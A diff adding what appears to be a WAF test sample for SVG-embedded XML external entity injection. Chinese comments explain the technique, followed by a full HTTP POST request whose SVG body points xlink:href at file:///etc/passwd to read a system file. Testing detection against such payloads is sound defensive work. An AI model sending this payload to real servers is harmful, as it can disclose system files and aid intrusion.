@@ -1,0 +1,12 @@
+# XML外部实体注入_SVG内部XXE
+# SVG是可缩放矢量图形（Scalable Vector Graphics），是一种基于XML语言的矢量图形标准。
+# 攻击者可以将payload代码插入到SVG格式内部，从而进行XXE攻击。
+POST /?bid=hd_tag_m8mv24mp HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv24mp
+RM-PRO-Token: be1fe44c6b76b871b90b5c531ed5901e
+RM-PRO-Time: 1742808393079
+User-Agent: curl/7.83.1
+Content-Type: application/xml
+
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200"><image xlink:href="file:///etc/passwd"></image></svg>
